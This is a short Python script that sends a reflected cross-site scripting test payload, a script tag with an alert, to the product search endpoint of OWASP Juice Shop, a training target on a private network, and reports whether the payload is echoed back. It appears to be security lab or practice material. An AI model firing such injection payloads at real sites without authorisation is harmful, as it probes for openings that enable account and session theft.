import requests

# Target URL (Juice Shop search endpoint)
url = "http://192.168.1.51/rest/products/search"

# Malicious XSS payload
xss_payload = "<script>alert('XSS Attack!');</script>"

# Send the payload in the query parameter
params = {
    "q": xss_payload
}

response = requests.get(url, params=params)

# Check if the payload is reflected in the response
if xss_payload in response.text:
    print("XSS Vulnerability Detected!")
else:
    print("No XSS Vulnerability Found.")